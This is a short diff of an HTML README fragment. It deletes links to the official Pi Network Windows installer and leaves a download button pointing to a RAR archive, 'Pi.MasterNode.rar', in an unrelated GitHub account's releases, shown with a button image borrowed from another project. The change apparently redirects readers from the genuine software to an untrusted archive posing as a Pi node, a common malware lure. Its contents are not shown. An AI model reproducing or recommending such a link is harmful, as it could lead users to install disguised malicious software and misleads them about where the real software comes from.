@@ -1,4 +1,4 @@
-<a href="https://downloads.minepi.com/Pi%20Network%20Setup%200.4.11.exe"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://downloads.minepi.com/Pi%20Network%20Setup%200.4.11.exe">PI node for Windows</a>
+
 <a href="https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Pi.MasterNode.rar"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
 </p>
 
